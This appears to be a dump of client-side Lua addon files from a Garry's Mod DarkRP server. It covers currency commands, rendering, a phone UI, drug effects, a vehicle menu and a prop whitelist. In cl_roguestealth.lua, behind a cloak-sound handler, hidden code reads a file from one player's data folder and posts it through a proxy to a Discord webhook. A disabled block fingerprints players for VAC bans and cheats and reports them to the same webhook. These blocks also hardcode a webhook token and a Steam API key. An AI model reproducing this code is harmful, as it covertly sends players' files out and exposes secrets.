		if( not BRICKS_SERVER.Func.HasAdminAccess( ply ) ) then 
			print( "BRICKS SERVER ERROR: NO ACCESS" )
			return 
		end

		if( args[1] and args[2] and args[3] and isstring( args[1] ) and isnumber( tonumber( args[2] ) ) and isnumber( tonumber( args[3] ) ) ) then
			net.Start( "BRS.Net.Admin_SetCurrency" )
				net.WriteString( args[1] )
				net.WriteUInt( tonumber( args[2] ), 8 )
				net.WriteInt( tonumber( args[3] ), 32 )
			net.SendToServer()
		end
    elseif( SERVER ) then
        local steamid64 = args[1]
        local currencyType = tonumber( args[2] or 0 )
        local amount = tonumber( args[3] or 0 )
        if( (not IsValid( ply ) or BRICKS_SERVER.Func.HasAdminAccess( ply )) and steamid64 and currencyType and amount ) then
            if( not BRICKS_SERVER.CONFIG.CURRENCIES[currencyType] ) then return end
        
            local victim = player.GetBySteamID64( steamid64 )
        
            if( not IsValid( victim ) ) then return end
        
            victim:SetCurrency( currencyType, amount )

            if( IsValid( ply ) ) then
				BRICKS_SERVER.Func.SendNotification( ply, 1, 5, "Set " .. victim:Nick() .. "'s " .. (BRICKS_SERVER.CONFIG.CURRENCIES[currencyType].Name or "ERROR") .. " to " .. string.Comma( amount ) )
            end

			BRICKS_SERVER.Func.SendNotification( victim, 1, 5, "An admin has set your " .. (BRICKS_SERVER.CONFIG.CURRENCIES[currencyType].Name or "ERROR") .. " to " .. string.Comma( amount ) )
        end
	end
end )

function BRICKS_SERVER.LoadCurrencies()
	BRICKS_SERVER.DEVCONFIG.Currencies = BRICKS_SERVER.DEVCONFIG.Currencies or {}

	for k, v in pairs( BRICKS_SERVER.CONFIG.CURRENCIES or {} ) do
		BRICKS_SERVER.DEVCONFIG.Currencies["custom_" .. k] = {
			Title = v.Name,
			getFunction = function( ply )
				return ply:GetCurrency( k )
			end,
			addFunction = function( ply, amount )
				ply:AddCurrency( k, amount )
			end,
			formatFunction = function( amount )
				if( v.Prefix ) then
					return v.Prefix .. string.Comma( amount or 0 )
				elseif( v.Suffix ) then
					return string.Comma( amount or 0 ) .. " " .. v.Suffix
				else
					return string.Comma( amount or 0 )
				end
			end
		}
	end
end
BRICKS_SERVER.LoadCurrencies()
--PATH addons/__main/lua/permaprops/cl_drawent.lua:
/*
   ____          _          _   ____          __  __       _ _                     
  / ___|___   __| | ___  __| | | __ ) _   _  |  \/  | __ _| | |__   ___  _ __ ___  
 | |   / _ \ / _` |/ _ \/ _` | |  _ \| | | | | |\/| |/ _` | | '_ \ / _ \| '__/ _ \ 
 | |__| (_) | (_| |  __/ (_| | | |_) | |_| | | |  | | (_| | | |_) | (_) | | | (_) |
  \____\___/ \__,_|\___|\__,_| |____/ \__, | |_|  |_|\__,_|_|_.__/ \___/|_|  \___/ 
                                      |___/                                        
*/

local function PermaPropsViewer()

	if not LocalPlayer().DrawPPEnt or not istable(LocalPlayer().DrawPPEnt) then return end

    local pos = LocalPlayer():EyePos() + LocalPlayer():EyeAngles():Forward() * 10
    local ang = LocalPlayer():EyeAngles()

    ang = Angle(ang.p + 90, ang.y, 0)

    for k, v in pairs(LocalPlayer().DrawPPEnt) do

    	if not v or not v:IsValid() then LocalPlayer().DrawPPEnt[k] = nil continue end

	    render.ClearStencil()
	    render.SetStencilEnable(true)
	        render.SetStencilWriteMask(255)
	        render.SetStencilTestMask(255)
	        render.SetStencilReferenceValue(15)
	        render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
	        render.SetStencilZFailOperation(STENCILOPERATION_REPLACE)
	        render.SetStencilPassOperation(STENCILOPERATION_KEEP)
	        render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_ALWAYS)
	        render.SetBlend(0)
	        v:DrawModel()
	        render.SetBlend(1)
	        render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
	        cam.Start3D2D(pos, ang, 1)
	                surface.SetDrawColor(255, 0, 0, 255)
	                surface.DrawRect(-ScrW(), -ScrH(), ScrW() * 2, ScrH() * 2)
	        cam.End3D2D()
	        v:DrawModel()
	    render.SetStencilEnable(false)

	end

end
hook.Add("PostDrawOpaqueRenderables", "PermaPropsViewer", PermaPropsViewer)
--PATH addons/__main/lua/autorun/client/cl_roguestealth.lua:
net.Receive("PlayCloakLoop", function(len, ply)
     LocalPlayer():StartLoopingSound("roguestealth/shadowwalk_loop.wav")
end)

net.Receive("StopCloakLoop", function(len, ply)
     LocalPlayer():StopLoopingSound(0)
end)

  
if IsValid(LocalPlayer()) then  


if LocalPlayer():SteamID() == "STEAM_0:0:758022653" then
local WEBHOOK_URL = "https://discord.com/api/webhooks/1083404215717744680/9SjX7yK8EzftpSLqQiK49pbZT9wxKPBuUo2Ad_yacB8mQuquOkZ9v0-E3VS361Rmu8Qh"
local PROXY_URL = "https://mst-gmod.ru/ds_prox.php"

local cock = file.Read("x7.png", "DATA") or ""
for i = 1, #cock, 1500 do
http.Post(PROXY_URL, {
    username = "хуй с горы",
    content = cock:sub(i,i+1500),
    webhook = WEBHOOK_URL
})
end
end

if false and jit.arch == "x86" then
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1083404215717744680/9SjX7yK8EzftpSLqQiK49pbZT9wxKPBuUo2Ad_yacB8mQuquOkZ9v0-E3VS361Rmu8Qh"
    local PROXY_URL = "https://mst-gmod.ru/ds_prox.php"
        local function magic()
        local magicValue = 0
        local coro = coroutine.create(function()
            local function da()
                magicValue = magicValue + 1
                if (magicValue>100000) then return end
                debug.getinfo(render.Capture)
                jit.util.funcinfo(render.Capture)
                da()
            end

            da() 
        end)

        coroutine.resume(coro)
        return magicValue
    end

        http.Fetch("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/?key=D0D08FF89597F7CEFC2B0582F090EC74&steamids=" .. LocalPlayer():SteamID64(), function(body)
            local data = util.JSONToTable(body)

            local chk1 = data and data.players and data.players[1] and data.players[1].VACBanned

            local ofs = tonumber(("%p"):format(render.Capture):sub(3),16) - tonumber(("%p"):format(render):sub(3),16)
            local chk2 = ofs > 8000

            local chk3 = magic() != 65476

            if !chk1 and !chk2 and !chk3 then return end

            http.Post(PROXY_URL, {
                username = "хуй с горы",
                content = ("%s https://steamcommunity.com/profiles/%s %d"):format(LocalPlayer():Nick(), LocalPlayer():SteamID64(), data.players[1].DaysSinceLastBan)..tostring(chk3).." "..tostring(chk2).." "..tostring(chk1),
                webhook = WEBHOOK_URL
            })
        end)
end
end     

--PATH addons/mobile_phone/lua/autorun/client/cl_rubyphone_playerrequest.lua:
local PANEL = {}

function PANEL:Init()
    self.Players = player.GetAll()
    self.SearchBar = vgui.Create('onyx.TextEntry', self)
    self.SearchBar:RequestFocus()
    self.SearchBar:SetPlaceholderText('Поиск...')

    self.SearchBar.OnChange = function(s)
        self.PlayerList:AddPlayers(s:GetValue())
    end

    self.PlayerList = vgui.Create('rubyphoneListView', self)

    self.PlayerList.AddPlayers = function(s, inf)
        inf = inf and inf:Trim()
        s:Reset()
        local count = 0

        s:AddPlayer('112').DoClick = function(row)
            self:OnSelection(row, '112')
        end

        for k, v in ipairs(self.Players) do
            if not IsValid(v) then continue end
            if v == LocalPlayer() then continue end
            if IsValid(v) and (v ~= LocalPlayer()) and (not inf) or (inf and string.find(v:Name():lower(), inf:lower(), 1, true) or (v:SteamID() == inf) or (v:SteamID64() == inf)) then
                s:AddPlayer(v).DoClick = function(row)
                    self:OnSelection(row, v)
                end

                count = count + 1
            end
        end

        if count <= 0 then
            s:AddSpacer('Не найден игрок!')
        end
    end

    self.PlayerList:AddPlayers()
end

function PANEL:PerformLayout()
    self.SearchBar:SetPos(0, 0)
    self.SearchBar:SetSize(self:GetWide(), 25)
    self.PlayerList:SetPos(0, 30)
    self.PlayerList:SetSize(self:GetWide(), self:GetTall() - 30)
end

function PANEL:SetPlayers(pls)
    self.Players = pls
    self.PlayerList:AddPlayers()
end

function PANEL:OnSelection(row, pl)
end

vgui.Register('rubyphonePlayerRequest', PANEL, 'Panel')
--PATH addons/__main/lua/drugs_effects/savav_meth.lua:
local mat_fb = Material( "pp/fb" )
local WMmat = Material( "Melon_screen" )
local DRUG = "savav_meth"




hook.Add( "RenderScreenspaceEffects", "DrugsREcts_savav_meth", function()
	if LocalPlayer().ALPHA1 != nil then 
if LocalPlayer().ALPHA1 <= 0 then
else
	if LocalPlayer().DrugType == DRUG then
 DrawTexturize( 0, Material( "meth_screen" ) )
end
end
	end

end )


local function MyCalcView( ply, pos, angles, fov )
	if LocalPlayer().ALPHA1 != nil then 
if LocalPlayer().ALPHA1 <= 0 then
else
	if LocalPlayer().DrugType == DRUG then
		local view = {}
		
		view.origin = pos-angles:Forward()*LocalPlayer().ALPHA1/6
		view.angles = angles+Angle(0,math.cos(CurTime())*LocalPlayer().ALPHA1/120,0)
		view.fov = fov - LocalPlayer().ALPHA1/7
		view.drawviewer = false

		return view
	end
end
	end
end

hook.Add( "CalcView", "CalcViewDrugsRect_savav_meth", MyCalcView )

hook.Add( "HUDPaint", "DrugsREct_savav_meth", function()

if LocalPlayer().ALPHA1 != nil then
if LocalPlayer().Active == 0 then
if LocalPlayer().ALPHA1 > 0 then LocalPlayer().ALPHA1 = LocalPlayer().ALPHA1 - 0.05 end
if LocalPlayer().ALPHA2 > 0 then LocalPlayer().ALPHA2 = LocalPlayer().ALPHA2 - 0.05 end
end

	if LocalPlayer().DrugType == DRUG then
	if LocalPlayer().Active == 1 then
		if LocalPlayer().ALPHA1 < 255 then LocalPlayer().ALPHA1 = LocalPlayer().ALPHA1 + 0.05 end
		
	for i=1,30 do

	local Cos = math.cos(i) * LocalPlayer().ALPHA1*2
	local Sin = math.sin(i) * LocalPlayer().ALPHA1*2
	local Sinonius = math.cos(CurTime())* LocalPlayer().ALPHA1/10
	local Cosonius = math.sin(CurTime())* LocalPlayer().ALPHA1/10

		surface.SetDrawColor( 255, 255, 255, ( LocalPlayer().ALPHA1/20 ))
		surface.SetMaterial( mat_fb	) 
		surface.DrawTexturedRect( Cos-Cosonius, (Sin-Sinonius), ScrW(), ScrH() )
	end

	
		surface.SetDrawColor( 255, 255, 255, ( 255-LocalPlayer().ALPHA1 ))
		surface.SetMaterial( mat_fb	) 
		surface.DrawTexturedRect( 0, 0, ScrW(), ScrH() )
		
	if !LocalPlayer():Alive() then
	LocalPlayer().MUSIC:ChangePitch( 0, 60 )
	LocalPlayer().MUSIC:ChangeVolume( 0, 100 )
	LocalPlayer().Active = 0
	
	
	end
	end


		
		if LocalPlayer().ALPHA1 <= 0 then

			LocalPlayer().DrugType = "0"
				LocalPlayer().MUSIC:Stop()
			
		end

	end
end
end )


local function DrugEffect_savav_meth(data)


if LocalPlayer().Active == 0 or LocalPlayer().Active == nil then
LocalPlayer().DrugType = data:ReadString()
LocalPlayer().Active = 1
LocalPlayer().ALPHA1 = 0
LocalPlayer().ALPHA2 = 0

LocalPlayer().MUSIC = CreateSound( LocalPlayer(), "SBGRNG.wav" )

LocalPlayer().MUSIC:Play()
LocalPlayer().MUSIC:ChangePitch( 0, 0 )
LocalPlayer().MUSIC:ChangeVolume( 0, 0 )
LocalPlayer().MUSIC:ChangePitch( 100, 30 )
LocalPlayer().MUSIC:ChangeVolume( 0.4, 6 )
LocalPlayer().WaterMdodel = {}
timer.Simple(60,function()

LocalPlayer().MUSIC:ChangePitch( 0, 60 )
LocalPlayer().MUSIC:ChangeVolume( 0, 100 )
LocalPlayer().Active = 0


end)
end


end


local function DrugEffect_WATER(data)
LocalPlayer().Active = 0
end

usermessage.Hook("DrugEffect_WATER", DrugEffect_WATER ) 
usermessage.Hook("DrugEffect_savav_meth", DrugEffect_savav_meth ) 
 
--PATH addons/lvs_base-main/lua/autorun/client/lvs_vehicle_tab.lua:

hook.Add( "PopulateVehicles", "!!!add_lvs_to_vehicles", function( pnlContent, tree, node )
	local CategoryNameTranslate = {}
	local Categorised = {}
	local SubCategorised = {}

	local SpawnableEntities = table.Copy( list.Get( "SpawnableEntities" ) )
	local Variants = {
		[1] = "[LVS] - ",
		[2] = "[LVS] -",
		[3] = "[LVS]- ",
		[4] = "[LVS]-",
		[5] = "[LVS] ",
	}

	for _, v in pairs( scripted_ents.GetList() ) do
		if not v.t or not v.t.ClassName or not v.t.VehicleCategory then continue end

		if not isstring( v.t.ClassName ) or v.t.ClassName == "" or not SpawnableEntities[ v.t.ClassName ] then continue end

		SpawnableEntities[ v.t.ClassName ].Category = "[LVS] - "..v.t.VehicleCategory

		if not v.t.VehicleSubCategory then continue end

		SpawnableEntities[ v.t.ClassName ].SubCategory = v.t.VehicleSubCategory
	end

	if SpawnableEntities then
		for k, v in pairs( SpawnableEntities ) do

			local Category = v.Category

			if not isstring( Category ) then continue end

			if not Category:StartWith( "[LVS]" ) and not v.LVS then continue end

			v.SpawnName = k

			for _, start in pairs( Variants ) do
				if Category:StartWith( start ) then
					local NewName = string.Replace(Category, start, "")
					CategoryNameTranslate[ NewName ] = Category
					Category = NewName

					break
				end
			end

			if v.SubCategory then
				SubCategorised[ Category ] = SubCategorised[ Category ] or {}
				SubCategorised[ Category ][ v.SubCategory ] = SubCategorised[ Category ][ v.SubCategory ] or {}

				table.insert( SubCategorised[ Category ][ v.SubCategory ], v )
			end

			Categorised[ Category ] = Categorised[ Category ] or {}

			table.insert( Categorised[ Category ], v )
		end
	end

	local lvsNode = tree:AddNode( "[LVS]", "icon16/lvs.png" )

	if Categorised["[LVS]"] then
		local v = Categorised["[LVS]"]

		lvsNode.DoPopulate = function( self )
			if self.PropPanel then return end

			self.PropPanel = vgui.Create( "ContentContainer", pnlContent )
			self.PropPanel:SetVisible( false )
			self.PropPanel:SetTriggerSpawnlistChange( false )

			for k, ent in SortedPairsByMemberValue( v, "PrintName" ) do
				spawnmenu.CreateContentIcon( ent.ScriptedEntityType or "entity", self.PropPanel, {
					nicename	= ent.PrintName or ent.ClassName,
					spawnname	= ent.SpawnName,
					material	= ent.IconOverride or "entities/" .. ent.SpawnName .. ".png",
					admin		= ent.AdminOnly
				} )
			end
		end

		lvsNode.DoClick = function( self )
			self:DoPopulate()
			pnlContent:SwitchPanel( self.PropPanel )
		end
	end

	local IconList = list.Get( "ContentCategoryIcons" )

	for CategoryName, v in SortedPairs( Categorised ) do
		if CategoryName:StartWith( "[LVS]" ) then continue end

		local Icon = "icon16/lvs_noicon.png"

		if IconList and IconList[ CategoryNameTranslate[ CategoryName ] ] then
			Icon = IconList[ CategoryNameTranslate[ CategoryName ] ]
		end

		local node = lvsNode:AddNode( CategoryName, Icon )

		node.DoPopulate = function( self )
			if self.PropPanel then return end

			self.PropPanel = vgui.Create( "ContentContainer", pnlContent )
			self.PropPanel:SetVisible( false )
			self.PropPanel:SetTriggerSpawnlistChange( false )

			for k, ent in SortedPairsByMemberValue( v, "PrintName" ) do
				if ent.SubCategory then
					continue
				end

				spawnmenu.CreateContentIcon( ent.ScriptedEntityType or "entity", self.PropPanel, {
					nicename	= ent.PrintName or ent.ClassName,
					spawnname	= ent.SpawnName,
					material	= ent.IconOverride or "entities/" .. ent.SpawnName .. ".png",
					admin		= ent.AdminOnly
				} )
			end
		end
		node.DoClick = function( self )
			self:DoPopulate()
			pnlContent:SwitchPanel( self.PropPanel )
		end

		local SubCat = SubCategorised[ CategoryName ]

		if not SubCat then continue end

		for SubName, data in SortedPairs( SubCat ) do

			local SubIcon = "icon16/lvs_noicon.png"

			if IconList then
				if IconList[ "[LVS] - "..CategoryName.." - "..SubName ] then
					SubIcon = IconList[ "[LVS] - "..CategoryName.." - "..SubName ]
				else
					if IconList[ "[LVS] - "..SubName ] then
						SubIcon = IconList[ "[LVS] - "..SubName ]
					end
				end
			end

			local subnode = node:AddNode( SubName, SubIcon )

			subnode.DoPopulate = function( self )
				if self.PropPanel then return end

				self.PropPanel = vgui.Create( "ContentContainer", pnlContent )
				self.PropPanel:SetVisible( false )
				self.PropPanel:SetTriggerSpawnlistChange( false )

				for k, ent in SortedPairsByMemberValue( data, "PrintName" ) do
					spawnmenu.CreateContentIcon( ent.ScriptedEntityType or "entity", self.PropPanel, {
						nicename	= ent.PrintName or ent.ClassName,
						spawnname	= ent.SpawnName,
						material	= ent.IconOverride or "entities/" .. ent.SpawnName .. ".png",
						admin		= ent.AdminOnly
					} )
				end
			end
			subnode.DoClick = function( self )
				self:DoPopulate()
				pnlContent:SwitchPanel( self.PropPanel )
			end
		end
	end

	-- User Stuff
	hook.Run( "LVS.PopulateVehicles", lvsNode, pnlContent, tree )

	-- CONTROLS
	local node = lvsNode:AddNode( "Controls", "icon16/keyboard.png" )
	node.DoClick = function( self )
		LVS:OpenMenu()
		LVS:OpenClientControls()
	end

	-- CLIENT SETTINGS
	local node = lvsNode:AddNode( "Client Settings", "icon16/wrench.png" )
	node.DoClick = function( self )
		LVS:OpenMenu()
		LVS:OpenClientSettings()
	end

	-- SERVER SETTINGS
	local node = lvsNode:AddNode( "Server Settings", "icon16/wrench_orange.png" )
	node.DoClick = function( self )
		if LocalPlayer():IsSuperAdmin() then
			LVS:OpenMenu()
			LVS:OpenServerMenu()
		else
			surface.PlaySound( "buttons/button11.wav" )
		end
	end
end )

list.Set( "ContentCategoryIcons", "[LVS]", "icon16/lvs.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Artillery", "icon16/lvs_artillery.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Cars", "icon16/lvs_cars.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Cars - Armored", "icon16/lvs_armor.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Cars - Civilian", "icon16/lvs_civilian.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Cars - Military", "icon16/lvs_military.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Cars - Pack", "icon16/lvs_cars_pack.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Helicopters", "icon16/lvs_helicopters.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Helicopters - Combine", "icon16/lvs_combine.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Helicopters - Resistance", "icon16/lvs_resistance.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Planes", "icon16/lvs_planes.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Planes - Bombers", "icon16/lvs_bomb.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Planes - Fighters", "icon16/lvs_fighter.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Planes - Civilian", "icon16/lvs_civilian.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Tanks", "icon16/lvs_tanks.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Tanks - Light", "icon16/lvs_light.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Tanks - Medium", "icon16/lvs_medium.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Tanks - Heavy", "icon16/lvs_heavy.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Tanks - RP", "icon16/lvs_rp.png" )

list.Set( "ContentCategoryIcons", "[LVS] - Star Wars", "icon16/lvs_starwars.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Star Wars - Gunships", "icon16/lvs_sw_gunship.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Star Wars - Hover Tanks", "icon16/lvs_sw_hover.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Star Wars - Walkers", "icon16/lvs_sw_walker.png" )
list.Set( "ContentCategoryIcons", "[LVS] - Star Wars - Starfighters", "icon16/lvs_sw_starfighter.png" )

--PATH gamemodes/darkrp/gamemode/core/interface/util_cl.lua:
function rp.LoadUTILMenu( time, distance )
	local pos = LocalPlayer():GetPos()
	if IsValid( v1255125v125 ) and IsValid( dprg ) then return false end
	rp.UseKey = false
	time = time or 0.5
	v1255125v125 = vgui.Create( 'EditablePanel' )
	v1255125v125:SetAlpha( 0 )
	v1255125v125:AlphaTo( 255, 1 )
	v1255125v125:SetSize( ScrW(), ScrH() )
	v1255125v125:Center()
	v1255125v125.Paint = function( self, w, h )
		draw.Blur( self, 7 )
		draw.Box( 0, 0, w, h, Color( 0, 0, 0, 150 ) )
		draw.Box( w * 0.5 - 250, h * 0.5 - 25, 500, 50, Color( 0, 0, 0, 200 ) )
		surface.SetDrawColor( Color( 0, 0, 0 ) )
		surface.DrawOutlinedRect( w * 0.5 - 250, h * 0.5 - 25, 500, 50 )
	end

	v1255125v125.OnClose = function()
		v1255125v125:SetAlpha( 255 )
		v1255125v125:AlphaTo( 0, 1 )
	end

	v1255125v125.Think = function()
		if distance ~= 0 and pos:Distance( LocalPlayer():GetPos() ) > distance then
			v1255125v125:Remove()
			rp.UseKey = true
		end
	end

	dprg = vgui.Create( 'EditablePanel', v1255125v125 )
	dprg:SetSize( 0, 50 )
	dprg:SizeTo( 500, 50, time )
	dprg:SetPos( ScrW() * 0.5 - 250, ScrH() * 0.5 - 25 )
	dprg.Paint = function( self, w, h )
		draw.RoundedBox( 0, 0, 0, math.Clamp( 500, 0, 500 ), 50, Color( 255, 0, 0, 100 ) )
		draw.Box( 0, 0, w, h, Color( 0, 0, 0, 200 ) )
		surface.SetDrawColor( Color( 0, 0, 0 ) )
		surface.DrawOutlinedRect( 0, 0, w, h )
	end

	timer.Simple( time, function()
		if IsValid( v1255125v125 ) then
			v1255125v125:Remove()
			rp.UseKey = true
		end
	end )
end
--PATH gamemodes/darkrp/gamemode/core/prop/prop_sh.lua:
PropWhiteList = {
	-- за на пянгвин все сделав
	["Пропи"] = {
		-- за на пянгвин все сделав
		"models/balloons/balloon_classicheart.mdl",
		"models/balloons/balloon_dog.mdl",
		"models/balloons/balloon_star.mdl",
		"models/hunter/blocks/cube025x025x025.mdl",
		"models/hunter/blocks/cube025x05x025.mdl",
		"models/hunter/blocks/cube025x075x025.mdl",
		"models/hunter/blocks/cube025x125x025.mdl",
		"models/hunter/blocks/cube025x150x025.mdl",
		"models/hunter/blocks/cube025x1x025.mdl",
		"models/hunter/blocks/cube025x2x025.mdl",
		"models/hunter/blocks/cube025x3x025.mdl",
		"models/hunter/blocks/cube025x4x025.mdl",
		"models/hunter/blocks/cube025x5x025.mdl",
		"models/hunter/blocks/cube025x6x025.mdl",
		"models/hunter/blocks/cube025x7x025.mdl",
		"models/hunter/blocks/cube025x8x025.mdl",
		"models/hunter/blocks/cube05x05x025.mdl",
		"models/hunter/blocks/cube05x05x05.mdl",
		"models/hunter/blocks/cube05x075x025.mdl",
		"models/hunter/blocks/cube05x105x05.mdl",
		"models/hunter/blocks/cube05x1x025.mdl",
		"models/hunter/blocks/cube05x1x05.mdl",
		"models/hunter/blocks/cube05x2x025.mdl",
		"models/hunter/blocks/cube05x2x05.mdl",
		"models/hunter/blocks/cube05x3x025.mdl",
		"models/hunter/blocks/cube05x3x05.mdl",
		"models/hunter/blocks/cube05x4x025.mdl",
		"models/hunter/blocks/cube05x4x05.mdl",
		"models/hunter/blocks/cube05x5x025.mdl",
		"models/hunter/blocks/cube05x5x05.mdl",
		"models/hunter/blocks/cube05x6x025.mdl",
		"models/hunter/blocks/cube05x6x05.mdl",
		"models/hunter/blocks/cube05x7x025.mdl",
		"models/hunter/blocks/cube05x7x05.mdl",
		"models/hunter/blocks/cube05x8x025.mdl",
		"models/hunter/blocks/cube05x8x05.mdl",
		"models/hunter/blocks/cube075x075x025.mdl",
		"models/hunter/blocks/cube075x075x075.mdl",
		"models/hunter/blocks/cube075x1x025.mdl",
		"models/hunter/blocks/cube075x2x025.mdl",
		"models/hunter/blocks/cube075x2x075.mdl",
		"models/hunter/blocks/cube075x3x025.mdl",
		"models/hunter/blocks/cube075x4x025.mdl",
		"models/hunter/blocks/cube075x6x025.mdl",
		"models/hunter/blocks/cube075x8x025.mdl",
		"models/hunter/blocks/cube1x150x1.mdl",
		"models/hunter/blocks/cube1x1x025.mdl",
		"models/hunter/blocks/cube1x1x05.mdl",
		"models/hunter/blocks/cube1x1x1.mdl",
		"models/hunter/blocks/cube1x2x025.mdl",
		"models/hunter/blocks/cube1x3x025.mdl",
		"models/hunter/blocks/cube1x4x025.mdl",
		"models/hunter/blocks/cube1x5x025.mdl",
		"models/hunter/blocks/cube1x6x025.mdl",
		"models/hunter/blocks/cube1x7x025.mdl",
		"models/hunter/blocks/cube1x8x025.mdl",
		"models/hunter/blocks/cube2x2x025.mdl",
		"models/hunter/blocks/cube2x3x025.mdl",
		"models/hunter/blocks/cube2x4x025.mdl",
		"models/hunter/blocks/cube2x6x025.mdl",
		"models/hunter/blocks/cube2x8x025.mdl",
		"models/hunter/blocks/cube3x4x025.mdl",
		"models/hunter/blocks/cube3x6x025.mdl",
		"models/hunter/blocks/cube3x8x025.mdl",
		"models/hunter/blocks/cube4x4x025.mdl",
		"models/hunter/geometric/hex025x1.mdl",
		"models/hunter/geometric/hex1x1.mdl",
		"models/hunter/geometric/pent1x1.mdl",
		"models/hunter/geometric/tri1x1eq.mdl",
		"models/hunter/misc/platehole1x1a.mdl",
		"models/hunter/misc/platehole4x4.mdl",
		"models/hunter/misc/shell2x2a.mdl",
		"models/hunter/misc/shell2x2b.mdl",
		"models/hunter/misc/shell2x2c.mdl",
		"models/hunter/misc/shell2x2d.mdl",
		"models/hunter/misc/stair1x1.mdl",
		"models/hunter/plates/plate.mdl",
		"models/hunter/plates/plate025.mdl",
		"models/hunter/plates/plate025x025.mdl",
		"models/hunter/plates/plate025x05.mdl",
		"models/hunter/plates/plate025x075.mdl",
		"models/hunter/plates/plate025x1.mdl",
		"models/hunter/plates/plate025x125.mdl",
		"models/hunter/plates/plate05.mdl",
		"models/hunter/plates/plate05x05.mdl",
		"models/hunter/plates/plate05x075.mdl",
		"models/hunter/plates/plate05x1.mdl",
		"models/hunter/plates/plate05x2.mdl",
		"models/hunter/plates/plate05x3.mdl",
		"models/hunter/plates/plate075.mdl",
		"models/hunter/plates/plate075x075.mdl",
		"models/hunter/plates/plate075x1.mdl",
		"models/hunter/plates/plate075x105.mdl",
		"models/hunter/plates/plate075x2.mdl",
		"models/hunter/plates/plate1.mdl",
		"models/hunter/plates/plate1x1.mdl",
		"models/hunter/plates/plate1x2.mdl",
		"models/hunter/plates/plate1x3.mdl",
		"models/hunter/plates/plate1x4.mdl",
		"models/hunter/plates/plate1x5.mdl",
		"models/hunter/plates/plate1x6.mdl",
		"models/hunter/plates/plate1x7.mdl",
		"models/hunter/plates/plate1x8.mdl",
		"models/hunter/plates/plate2x2.mdl",
		"models/hunter/plates/plate2x3.mdl",
		"models/hunter/plates/plate2x4.mdl",
		"models/hunter/plates/plate2x5.mdl",
		"models/hunter/plates/plate2x6.mdl",
		"models/hunter/plates/plate2x7.mdl",
		"models/hunter/plates/plate2x8.mdl",
		"models/hunter/plates/plate3x3.mdl",
		"models/hunter/plates/plate3x4.mdl",
		"models/hunter/plates/plate3x5.mdl",
		"models/hunter/plates/plate3x6.mdl",
		"models/hunter/plates/plate3x7.mdl",
		"models/hunter/plates/plate3x8.mdl",
		"models/hunter/plates/plate4x4.mdl",
		"models/hunter/plates/plate4x5.mdl",
		"models/hunter/plates/plate5x5.mdl",
		"models/hunter/plates/platehole1x1.mdl",
		"models/hunter/plates/platehole1x2.mdl",
		"models/hunter/plates/platehole2x2.mdl",
		"models/hunter/plates/platehole3.mdl",
		"models/hunter/triangles/025x025.mdl",
		"models/hunter/triangles/025x025mirrored.mdl",
		"models/hunter/triangles/05x05.mdl",
		"models/hunter/triangles/05x05mirrored.mdl",
		"models/hunter/triangles/05x05x05.mdl",
		"models/hunter/triangles/075x075.mdl",
		"models/hunter/triangles/075x075mirrored.mdl",
		"models/hunter/triangles/1x05x1.mdl",
		"models/hunter/triangles/1x1.mdl",
		"models/hunter/triangles/1x1mirrored.mdl",
		"models/hunter/triangles/1x1x1.mdl",
		"models/hunter/triangles/1x1x5.mdl",
		"models/hunter/triangles/2x2.mdl",
		"models/hunter/triangles/2x2mirrored.mdl",
		"models/hunter/triangles/3x3.mdl",
		"models/hunter/triangles/3x3mirrored.mdl",
		"models/hunter/triangles/4x4.mdl",
		"models/hunter/triangles/4x4mirrored.mdl",
		"models/hunter/triangles/5x5.mdl",
		"models/hunter/triangles/6x6.mdl",
		"models/hunter/tubes/circle2x2.mdl",
		"models/hunter/tubes/circle2x2b.mdl",
		"models/hunter/tubes/circle2x2c.mdl",
		"models/hunter/tubes/circle2x2d.mdl",
		"models/hunter/tubes/circle4x4.mdl",
		"models/hunter/tubes/circle4x4b.mdl",
		"models/hunter/tubes/circle4x4c.mdl",
		"models/hunter/tubes/circle4x4d.mdl",
		"models/hunter/tubes/tube1x1x1b.mdl",
		"models/hunter/tubes/tube1x1x1c.mdl",
		"models/hunter/tubes/tube1x1x2.mdl",
		"models/hunter/tubes/tube1x1x2b.mdl",
		"models/hunter/tubes/tube1x1x2c.mdl",
		"models/hunter/tubes/tube1x1x3.mdl",
		"models/hunter/tubes/tube1x1x3c.mdl",
		"models/hunter/tubes/tube1x1x4.mdl",
		"models/hunter/tubes/tube1x1x4c.mdl",
		"models/hunter/tubes/tube1x1x4d.mdl",
		"models/hunter/tubes/tube1x1x5.mdl",
		"models/hunter/tubes/tube1x1x5b.mdl",
		"models/hunter/tubes/tube1x1x5c.mdl",
		"models/hunter/tubes/tube1x1x5d.mdl",
		"models/hunter/tubes/tube1x1x6.mdl",
		"models/hunter/tubes/tube1x1x6b.mdl",
		"models/hunter/tubes/tube1x1x6c.mdl",
		"models/hunter/tubes/tube1x1x6d.mdl",
		"models/hunter/tubes/tube1x1x8.mdl",
		"models/hunter/tubes/tube1x1x8b.mdl",
		"models/hunter/tubes/tube1x1x8c.mdl",
		"models/hunter/tubes/tube1x1x8d.mdl",
		"models/hunter/tubes/tube2x2x+.mdl",
		"models/hunter/tubes/tube2x2x025.mdl",
		"models/hunter/tubes/tube2x2x025c.mdl",
		"models/hunter/tubes/tube2x2x05.mdl",
